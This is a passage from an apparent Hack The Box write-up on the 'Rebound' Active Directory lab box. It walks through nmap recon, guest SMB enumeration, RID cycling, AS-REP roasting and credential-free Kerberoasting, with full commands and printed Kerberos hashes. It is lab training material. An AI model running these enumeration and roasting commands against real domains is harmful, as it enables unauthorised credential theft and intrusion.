---
title: HTB: Rebound
url: https://0xdf.gitlab.io/2024/03/30/htb-rebound.html
date: 2024-03-30T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: ctf, htb-rebound, hackthebox, nmap, windows, active-directory, domain-controller, netexec, rid-cycle, lookupsid, kerberoast, kerberoast-without-auth, hashcat, password-spray, bloodhound, powerview, powerview-py, windows-acl, bloodyad, shadow-credential, certipy, qwinsta, cross-session, remotepotato0, krbrelay, gmsa, gmsapasswordreader, delegation, constrained-delegation, rbcd, kerberos, s4u2self, s4u2proxy, secretsdump, htb-absolute, htb-outdated, adcs, oscp-plus-v3
---

![Rebound](/img/rebound-cover.png)

Rebound is a monster Active Directory / Kerberos box. I’ll start off with a RID-cycle attack to get a list of users, and combine AS-REP-Roasting with Kerberoasting to get an crackable hash for a service account. That password is shared by a domain user, and I’ll find a bad ACL that allows that user control over an important group. With access to that group, I can change the password of or get a shadow credential for another user with WinRM access. I’ll perform a cross-session relay attack with both RemotePotato0 and KrbRelay to get a hash for the next user, who can read the GMSA password for another service account. This account has a constrained delegation, and I’ll need to abuse both that delegation as well as RBCD to get a ticket as the DC machine account, and dump hashes for the domain. This one is heavey into Active Directory and Kerberos!

## Box Info

| Name | [Rebound](https://hackthebox.com/machines/rebound)  [Rebound](https://hackthebox.com/machines/rebound) [Play on HackTheBox](https://hackthebox.com/machines/rebound) |
| --- | --- |
| Release Date | [09 Sep 2023](https://twitter.com/hackthebox_eu/status/1699837474292236451) |
| Retire Date | 30 Mar 2024 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Rebound |
| Radar Graph | Radar chart for Rebound |
| First Blood User | 18:04:12[0xEr3bus 0xEr3bus](https://app.hackthebox.com/users/606891) |
| First Blood Root | 23:22:14[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [Geiseric Geiseric](https://app.hackthebox.com/users/184611) |

## Recon

### nmap

`nmap` finds a lot of open TCP ports on Rebound:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.231
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-17 19:08 EDT
Nmap scan report for 10.10.11.231
Host is up (0.092s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49681/tcp open  unknown
49688/tcp open  unknown
49724/tcp open  unknown
55738/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.231
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-17 19:09 EDT
Nmap scan report for 10.10.11.231
Host is up (0.089s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 23:09:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:51+00:00; -1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:50+00:00; -2s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:51+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:50+00:00; -2s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/17%Time=65F77824%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-03-17T23:11:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.60 seconds

```

This combination of ports looks like a Windows Domain Controller. There’s an alternative name on the TLS certificate on some of the ports giving dc01.rebound.htb. Many of the ports show the domain rebound.htb.

Based on these ports, I’ll prioritize as:
- Tier 1
  - SMB - Check for unauth access to files, or writable shares. Enumerate users. Stuff in my [SMB cheat sheet](/cheatsheets/smb-enum).
- Tier 2
  - DNS - Check for Zone transfers, or brute force other subdomains.
  - Kerberos - Brute usernames if unable to with SMB. AS-REP-roast with usernames, Kerberoast with creds.
  - LDAP - Enumerate, though typically need creds (and do in this case).
- Other
  - WinRM - Check for shell with creds.

I will add the hosts to my `/etc/hosts` file:

```
10.10.11.231 dc01 rebound.htb dc01.rebound.htb

```

Having dc01 in there will prove important [later](#add-ldap_monitor-to-delegator).

### SMB - TCP 445

#### Host Enumeration

`netexec` shows the same thing as the `nmap` output:

```

oxdf@hacky$ netexec smb 10.10.11.231
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)

```

#### Shares

The guest user is able to list shares:

```

oxdf@hacky$ netexec smb 10.10.11.231 -u guest -p '' --shares
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest: 
SMB         10.10.11.231    445    DC01             [*] Enumerated shares
SMB         10.10.11.231    445    DC01             Share           Permissions     Remark
SMB         10.10.11.231    445    DC01             -----           -----------     ------
SMB         10.10.11.231    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.231    445    DC01             C$                              Default share
SMB         10.10.11.231    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.231    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.231    445    DC01             Shared          READ            
SMB         10.10.11.231    445    DC01             SYSVOL                          Logon server share 

```

These are the standard shares on a DC, plus `Shared`.

```

oxdf@hacky$ netexec smb 10.10.11.231 -u guest -p '' -M spider_plus
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest: 
SPIDER_P... 10.10.11.231    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_P... 10.10.11.231    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.10.11.231    445    DC01             [*]     STATS_FLAG: True
SPIDER_P... 10.10.11.231    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.11.231    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.11.231    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.11.231    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SMB         10.10.11.231    445    DC01             [*] Enumerated shares
SMB         10.10.11.231    445    DC01             Share           Permissions     Remark
SMB         10.10.11.231    445    DC01             -----           -----------     ------
SMB         10.10.11.231    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.231    445    DC01             C$                              Default share
SMB         10.10.11.231    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.231    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.231    445    DC01             Shared          READ            
SMB         10.10.11.231    445    DC01             SYSVOL                          Logon server share 
SPIDER_P... 10.10.11.231    445    DC01             [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.11.231.json".
SPIDER_P... 10.10.11.231    445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Shared, SYSVOL)
SPIDER_P... 10.10.11.231    445    DC01             [*] SMB Readable Shares:  2 (IPC$, Shared)
SPIDER_P... 10.10.11.231    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_P... 10.10.11.231    445    DC01             [*] Total folders found:  0
SPIDER_P... 10.10.11.231    445    DC01             [*] Total files found:    0

```

There are no files found that can be accessed with a null auth.

#### User Enumeration

I’ll perform a RID Cycling attack to enumerate users:

```

oxdf@hacky$ netexec smb 10.10.11.231 -u guest -p '' --rid-brute
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest: 
SMB         10.10.11.231    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.10.11.231    445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.10.11.231    445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.10.11.231    445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.10.11.231    445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.10.11.231    445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.10.11.231    445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.231    445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.10.11.231    445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.231    445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.231    445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.231    445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.10.11.231    445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.10.11.231    445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.231    445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.10.11.231    445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.10.11.231    445    DC01             3382: rebound\fflock (SidTypeUser)

```

By default, typical RID cycle attacks go up to RID 4000. For a larger domain, it may be necessary to expand that, so I’ll switch to `lookupsid.py` (though `netexec` works as well by adding the max number to the option like `--rid-brute 10000`). Trying 10,000 does find more users (I don’t find any above 8,000):

```

oxdf@hacky$ lookupsid.py -no-pass 'guest@rebound.htb' 20000
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Brute forcing SIDs at rebound.htb
[*] StringBinding ncacn_np:rebound.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
514: rebound\Domain Guests (SidTypeGroup)
515: rebound\Domain Computers (SidTypeGroup)
516: rebound\Domain Controllers (SidTypeGroup)
517: rebound\Cert Publishers (SidTypeAlias)
518: rebound\Schema Admins (SidTypeGroup)
519: rebound\Enterprise Admins (SidTypeGroup)
520: rebound\Group Policy Creator Owners (SidTypeGroup)
521: rebound\Read-only Domain Controllers (SidTypeGroup)
522: rebound\Cloneable Domain Controllers (SidTypeGroup)
525: rebound\Protected Users (SidTypeGroup)
526: rebound\Key Admins (SidTypeGroup)
527: rebound\Enterprise Key Admins (SidTypeGroup)
553: rebound\RAS and IAS Servers (SidTypeAlias)
571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
1000: rebound\DC01$ (SidTypeUser)
1101: rebound\DnsAdmins (SidTypeAlias)
1102: rebound\DnsUpdateProxy (SidTypeGroup)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)

```

I’ll run that again to make a `users` list:

```

oxdf@hacky$ lookupsid.py -no-pass 'guest@rebound.htb' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tee users
Administrator
Guest
krbtgt
DC01$
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
winrm_svc
batch_runner
tbrady
delegator$

```

## Auth as ldap\_monitor

### AS-Rep-Roast

Without creds, I can look for users that have the `DONT_REQUIRE_PREAUTH` flag set using the Impacket script `GetNPUsers.py`. It finds one:

```

oxdf@hacky$ GetNPUsers.py -usersfile users rebound.htb/ -dc-ip 10.10.11.231
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:125dac0dde12af5ecf9dc6d2cc15154a$7583e1f172d0af5550aabcb7e7630dc51722f46f656432714539a71a205fc4fe075267edd5ab35d36cf6204834cefb35afffb668f657a39baa4b627eb03bb98db77eacb3a17e950abd1d1d9bcb21872bb64b73d96eb52b4a2a5d9335a615e98b8f932b37df294f74de68eab318a048a2715585fddbcc4d691d52aa2b36cb1f268c21a4c7f4578f5e0317108dd5ed7133d3dbf1ba0f9c4949cb2371509afd9542554e9d71c9618fd0235f5e18d8b9fe2b46b2125d6f1946fdfb54a2cde72d910da0c90e11ac7cff1696d95defa9c9c0b6680f7d5cb65c5e77affa182a9cb2760efdd82c5ec065ca20005c
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set

```

`netexec` can do this as well:

```

oxdf@hacky$ netexec ldap 10.10.11.231 -u users -p '' --asreproast asrephashes.txt
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    445    DC01             $krb5asrep$23$jjones@REBOUND.HTB:878af35ccf86b307eeddf59caca892d0$1157eef31c59fa390193a36b8bd8fd1d82a61e3fd7d2a98b1cd96f367560cb8700223e8030bfc0c516c1e206f06d820c7ac1999303a00086701f208278a9539732375c79e695d240dad1b0095e17843dce414b027193697e5e4fdd5f58a6ca9fe2c9fe26fe7fbff034d4ad5c8e4fb1b4fe3b5cbfb6b2d719fa6c99c4fc5a0c8740779cda6c124ee7810a3b14be4b829057f8740218b746fd3ebb572852225f8845d883b3c3f3065206ac29b60b457e4c1e7d90c533e7144f38c2feabcb783e4e9b808f9485328feb46f1b6ae164ef68de2c6dee9d89b77d0e398b36d828b1fe3a6104c336412095cb1bc

```

It saves the hashes to the specified output file, in this case, `asprephashes.txt`.

I’ll take this over to `hashcat` and try to crack it, but it doesn’t crack on `rockyou.txt`, which means it’s likely not meant to be cracked on HTB.

### Kerberoast

#### Strategy

Typically I think of Kerberoasting as something I can do once I have at least one domain user’s creds. But [this research](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/) from Charlie Clark in Sept 2022 showed that it is possible to abuse a user with `DONT_REQUIRE_PREAUTH` to Kerberoast other users. The post summarizes:

> Therefore, if any account is configured to not require pre-authentication, it is possible to Kerberoast without **any** credentials. This method of Kerberoasting has been implemented in Rubeus within [this PR](https://github.com/GhostPack/Rubeus/pull/139).

It’s also implemented in `GetUserSPNs.py` from [this commit](https://github.com/fortra/impacket/commit/c3ff33b39fe067e738d5625ce174d3d10f7a4b79), though I had to install it from GitHub rather than PyPI to get it working (`pipx install git+https://github.com/fortra/impacket`).

#### Get Hashes

To Kerberoast this way (ASPERKerberoast?), I’ll use the `-no-preauth` flag, giving it the account that does not require preauth, jjones, as well as the `-usersfile`, the `-dc-host`, and the domain:

```

oxdf@hacky$ GetUserSPNs.py -no-preauth jjones -usersfile users -dc-host 10.10.11.231 rebound.htb/
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$a67e8d44265a81ba334c0034$f608e248d49cb2399a7a51a7c1a41eb09d80197325b7afd754bb3afc853acc5c47bca2cf565473215e9e2a7b8385f86ada8f274cd935fadda9738bfaa295006b973b63fbec17326ee1a5afd89bc219a58183961c07f0a02f3de7c9d2111549366772d65ddb72970e7b204cc1a89f7fafe369a1ab7321fb10477a362f68caa9f3f27d3b32a4d6ad6de989f1c85040e7c22922a684efedb71ef057dcd73853f61fac0574663384130299be20782b5917dc2c0ad1628fe65c41cd75b9b2995b3f58a124a790c27e865f52ad74af1aeb089e44066b2f8d73762a18a9603f2fb820272e03b251a5d50528312379a2cd64f61be38fae4e1e999c22aec8b2851bb54cbb3f51183579d4a47fad128c74a99594d1b8f7ba8906a9bdbf9406231ec0f961978ee3380b0c3eaf960a593b690b5916719206db6c93e2f6a39d123d275b10ca4b621be7fbe4800ea9c82bab818bfa87fcb6a95d124457c6349c1c5c08808a6c9e22ad2adda1981becfa0d9c7637d5e43cfb5f2bac1ed4a52705bd3b9eb3163600e9f7d17a36beba8b0cf9fdd7b9cf63982e4612c74f663fc4cc350b789e40dd8562ca8d98ae6399371eeae64b4ae8e041027b126cf15079d161233db1776497a8415f48671e45d17ca67bde162bbb7a81c65fb71ed524fc85a37767b2db3a707b7246961b85d09f2bbfe49964d09347ce45a6666a6cd69d9344279c3067bd7ef20972940748d327be36983f5be0fc76fe48192eca457c7d006defdc67ed2f8bf44c42d113e25086bb23732ebdb4503e30b70aa9accc52163d9cdf8fe5a5a9bad7d80ec6c10801b2e763eb4f69ee33faaed68a8bf155ecd31ba39e12157f5ccf7a8804963f847a2e1ee5b389ad85ac6fa2d316c53b01769e4d26d2c349124c838757dfbfcc0462e46eaefa47c9d69dbd2d75ce0399da2d233f418e5ebfd52eb1b0626a471073b7db138c1f1e36fc10f694ab47d5615603389e1d79a159c54e58f55fae073e008a0d63a37e7810c4e65c450268ec75437116b315e31262eed219b6831b9b68f4b02b033a79b3952c25ed826251f4ba56bb61530fa1746486219be9fe038483c5f17564104246a8f64ce59d58222e1dae9ff22355cb5c8a46334d14ce80311a121b923ccaeadbbe48ac48cd3813a445a9179b5b3c0a28c5e60fb1e5d9728bb357caa5297efc8a3257553b181ef4af8094f6bcac3d0bc4a0844be32cbc26f2bede86a357db915dbbe10dfda9bc9c60aca39aaf5eadaf02858e2bb6f5e01d775d65f8812d50ea7a1e03e98952131727ade106b4c6d4f632fae036d9a58db5342134839bec68d1540920f11bb8fd13354fa4428cf8a6220ca5bde44d625aa0d90fe46494048cffd87af1eccf6914702222d75e1e5b264a07c3635b5f5cbc16e9de30b6e4743680c1e5d51a230eadd2eb67d9f3a4887eb127ab4a26ee54219c81c76d9b5773a8496ef8a441554d00db
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$1074500dbce7b190527216c2$a9aa2953b0248276bb6d4be5694f3c458cb06a5f45a9d17c3039ace2ce4a1242cec4e4809c16cbb74020314093d6eef95953612c29cbce8af0dd341acf18bcf2faba5009102b2a4acf2df36954a39cfe8e98796467d73eeddbfe3438f4d5668ff908a1c16d58e69f888245c934513f21f8b895d670692133ce8c94b07c45e8a569c9684c0351472b6ef0bf33f33cba9fb442dd08dbd94876d1ccf94e1ecd0d94e807160f105beccf1924c67ab1ec89e76dee5c05c8f173cbe33cc52661bef7bbd835934e28c9094a3cb6152c54c4114d4d3caa557bfe0e643ba7380083364bc8a36a5b6f521fa697e7fea48ad975ffacba66bb5d9c89d842b3fe2a6f73a798a858bc0cfd8a872e6c75bace9f8a36cf73f1ff2a9c9f19c6441a2a64b19fd971bacc6ae326e2892652b8515d88307a2bcfd0f92401779e0f7fa397d3118bc080b2b01b6b5f3363fdece413cbeaaebda5d2523057e049a02d2896ebd58170136247363698c8e210d0a37ccf92205b678cf3b922284ed93ab9656a9da6f3c47971e3b0f85914863d82bd4fbf776a04a77d7b7713edc487f683cc76b335ad9f6b83a9556ae5681274ac527c5212707277b50faa008514d222f60947c4918e5be18ca2f631ae50ebc7cd9cab93795ad2fbe6e052d7056d3775a9fc29614bdbb36a686fd7a334341e2effca8709828545ec5f7ad91c33d42557cc03a57cecf80c4fea6b430065a0e9ddc3e95caaee3ffb40215a558fee45f37a0e61311c3383c631991f900b4de56db50b7c57dcd79c6e2b9893e6bab5f1d05fae142acaadaefa4539644b2fd00af7670ee098170e7502fd7633f796c1509ec059ead9e996a8400450f01257dffdd99553a323aabaf7f2dd3aa5f2e6bc64d92f161518d58511c52958589265d880acb23b06c478de964abcd700e1b513e4b3e9d701087867d31bd16508b2186c30f6c4891e5342454d97022fd94e4c6acf26468e934d4abbc9dcdb81103220172e6e4ac1a4b700175b588524ed5817203eacaeb53cd4a6d40d44e52141c540655ea26b99991b779d23966080a68d700920b36974a2681238fb81236798382e5c10a7934057872c92cc4f704fe8a658008f797ca36040685d2d0a70be8e3bafbe822161e1b4ab5c106d4d4e0ca11c4ffd1f711fffa4554e9e54a1df73c46dbf9bc6565c7e33c54b708c7fdbaf3f742a9267426c8fcf5764758feab2adc32d33cf6a367e2e725d05af30dadea52c49988b1cd60cda45e9ab4ce7e397a7cd1bc11397145751308e2e42e392f93ddf1afea8598c267176883e0d67e622cae4e5fdce2549f5c6ca88d9c50ca26addf867640648311b9ce6207c20accc3618ae6811eb57e098f10ed260
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$4a3d9ed584d85f87798c0dc49faf1492$0ee39c5f7b34afa232310e71da3a8e73a587526e37d430f2dab38f3c592f5b3dd71a187c5f522fba0e7b3e5b8c34a4e3052a20c3ab89b411239310a1817b2fe3ccd57d9f61a6487bbfcd8820fd6818b1a64a8b9e96660a88010c8a7c008e488d77974aa671be1c546ed755aa4c1b4acfdb51b1dc2c0f3d1969e6fe2eec1ed1371037a0968753cabeed8567fa19defbf99a1ceccf5bb566be1bdcd8378e3f6ffd5160ec2cc8193e0fa5504a2410d43036cde56e37c678866772d34e6e293bf0da464637a791e0e78001274918c2382d4c95234c0d4bcef739964d14deedcc2924458f62765e1c45facee5a06fc63d75dd0c3d656ded2aa667a6dc6287df413a47606d58155bdfbe8b6bfffb78df7ff5df858c851a5042add02224f016ba3f13c3b72569a0bdae8df35ee373e436c96fde899d3792cbb0488fbe65aa5f667a5c29bab229e2f4626154b4bb64431ed3ad1ac27e5fdc3b34ccfbb4cce864c4b952b3c31e0ec339d3fa9ed4e5356118e77f62c21a433aa4c5e7246a6faa60b360e9ede6b5aed614814a9df10fb50ed93d50996fc25bd5c2ea5705639eb462110d53c1c76cdb343d94b38d032ab4add73831fe05d5d21b9f79cb8daa625a209b08ec56b25d22860fe186fee1d331a8e12047e4b12af254512bc384b64aa163f6730386bd90824c936d365c16549e928a5ca626c775d63257598270dad198b42b14327c4a1e8f36966d41d1b42dee824fc94e9191e78733a3c639b4bf6b2e103ec781f9241af24b95c0ba3cae55551391a94fd18ea5f70dc1935020357c4e7dade65d1e8be8c0e3833d8f559f5d51e7746c07ae6e4d3786b5e8c81e95da867457ae2d0267de8f446473a244d1116283805a1850a5d8125cc29b1bcfdb2362665effb1b77a95a7bd25d4fa7d68b2ca499ed77dd2b5fabca253650c34570e0ed9638ed354e4f70e68d498ef98be09a3ec20484c310128fd778f4e8255fc253a48c79c8d985923e4263deb4b6af680f83456ed4bb85b3944436a899347e8f4034f184d984ba50b36d70879d1414522fcb3811374552f58b6b42e1185ad10b397c1a1e3f8dffa566e6b744bb6e3df2e6025f709f6ba3cafe39313d23f14ee0828fb17105a8c05955574ef67bfe4a85b20f79ce81ae0345d43190100f61ecd20a2cede2d79d613eca3cb9fb020686dc16b4af6ca3b92a29db2fb5b481bb2c77b0199cacc5e814ac4da1e59dd91aa673a788cef94b07d76154970a39c35dd0015d983fa295c9224c67a9264a0274bafb2c40dd3915726b0050fd5f5bf12c0ba91d6b6164e1b3b5c4bb9fb5d21658e6550bc46f4b3b6c3fd99b6313e809708e7183454c30cb8d1101d
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
